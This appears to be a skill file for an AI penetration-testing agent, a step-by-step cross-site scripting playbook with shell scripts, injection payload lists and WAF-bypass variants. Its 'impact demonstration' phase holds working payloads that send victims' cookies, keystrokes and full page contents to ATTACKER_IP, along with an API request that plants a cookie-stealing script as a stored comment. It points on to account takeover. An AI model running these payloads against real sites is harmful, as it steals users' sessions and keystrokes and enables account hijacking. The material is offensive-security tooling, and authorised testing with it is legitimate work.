---
name: vuln-xss
description: "Reflected and Stored XSS testing — injection point discovery, context-aware payload crafting, WAF bypass, stored XSS via API, CSP bypass, cookie theft, keylogging, BeEF hooking. Triggers: 'xss', 'cross site scripting', 'reflected xss', 'stored xss', 'xss payload', 'script injection', 'xss bypass', 'csp bypass', 'xss exploit', 'cookie theft xss'."
---

# XSS Testing (Reflected & Stored)

Inject JavaScript into application output to execute in victims' browsers.

---

## Phase 1: Injection Point Discovery

```bash
TARGET="https://TARGET"

# Find reflected parameters:
gau "$TARGET" 2>/dev/null | grep '=' | sort -u | tee output/params.txt

# Test each parameter for reflection:
while IFS= read -r URL; do
  PARAM=$(echo "$URL" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
  CANARY="xss_$(date +%s%N)"
  RESP=$(curl -s "${URL%%=*}=${CANARY}")
  if echo "$RESP" | grep -q "$CANARY"; then
    echo "REFLECTED: $URL (param: $PARAM)"
  fi
done < output/params.txt | tee output/xss_reflected.txt

# Automated scan:
python3 /tmp/dalfox/dalfox url "$TARGET/search?q=FUZZ" \
  --output output/dalfox_results.txt 2>&1

# Check HTML context:
curl -s "$TARGET/page?q=CANARY_TEST_STRING" | grep -C2 "CANARY_TEST_STRING"
```

---

## Phase 2: Context-Aware Payloads

```bash
TARGET="https://TARGET"

# HTML tag context — basic XSS:
PAYLOADS=(
  '<script>alert(1)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg/onload=alert(1)>'
  '<body onload=alert(1)>'
  '<input autofocus onfocus=alert(1)>'
)

# HTML attribute context — break out of attribute:
ATTR_PAYLOADS=(
  '" onmouseover="alert(1)'
  '" autofocus onfocus="alert(1)'
  '"><script>alert(1)</script>'
)

# JavaScript string context — break string:
JS_PAYLOADS=(
  "'-alert(1)-'"
  "';alert(1);//"
  '`-alert(1)-`'
)

# URL context — javascript: URI:
URL_PAYLOADS=(
  "javascript:alert(1)"
  "JaVaScRiPt:alert(1)"
  "data:text/html,<script>alert(1)</script>"
)

for P in "${PAYLOADS[@]}"; do
  curl -s "$TARGET/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$P'))")" | \
    grep -qF "$P" && echo "UNESCAPED: $P"
done
```

---

## Phase 3: WAF Bypass

```bash
TARGET="https://TARGET"

# Common WAF bypass payloads:
WAF_BYPASS=(
  '<ScRiPt>alert(1)</ScRiPt>'                    # Case
  '<script>alert`1`</script>'                     # Template literal
  '<svg><script>alert&#40;1&#41;</script></svg>'  # HTML encoding
  '<svg onload=alert(1)>'                    # Unicode escape
  '%3Cscript%3Ealert(1)%3C/script%3E'            # URL encoding
  '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">'  # Char codes
  "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
  '<iframe srcdoc="<script>alert(1)</script>">'
)

for P in "${WAF_BYPASS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$P'))")")
  echo "$STATUS | $P"
done | tee output/xss_waf_bypass.txt
```

---

## Phase 4: Impact Demonstration

```bash
LHOST="ATTACKER_IP"

# Cookie theft payload:
STEAL_COOKIE="<script>new Image().src='http://$LHOST/steal?c='+document.cookie</script>"

# Keylogger payload:
KEYLOG="<script>document.addEventListener('keypress',function(e){new Image().src='http://$LHOST/log?k='+e.key})</script>"

# Full page content exfiltration:
EXFIL="<script>fetch('http://$LHOST/exfil?d='+btoa(document.documentElement.innerHTML))</script>"

# CSP bypass via JSONP:
# <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

# Stored XSS — inject via API:
curl -s -X POST "$TARGET/api/comments" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d "{\"body\": \"<script>document.location='http://$LHOST/?c='+document.cookie</script>\"}"
```

---

## Output

Save to `output/`:
- `xss_reflected.txt` — reflected parameter hits
- `dalfox_results.txt` — automated scan output
- `xss_poc_url.txt` — URL to trigger XSS for report

## Next Phase

→ `vuln-account-takeover` to chain XSS to ATO
→ `pentest-report` to document findings
